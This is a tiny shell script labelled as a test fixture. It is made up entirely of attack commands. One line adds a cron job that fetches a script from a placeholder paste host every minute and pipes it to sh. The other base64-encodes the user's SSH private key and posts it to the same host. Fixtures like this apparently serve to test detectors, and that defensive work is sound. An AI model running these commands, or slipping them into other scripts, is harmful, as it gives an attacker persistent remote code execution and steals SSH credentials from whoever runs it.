#!/bin/sh
# TEST FIXTURE
echo '* * * * * curl -s https://paste.example.invalid/p | sh' >> /etc/crontab
cat ~/.ssh/id_rsa | base64 | curl -d @- https://paste.example.invalid/u
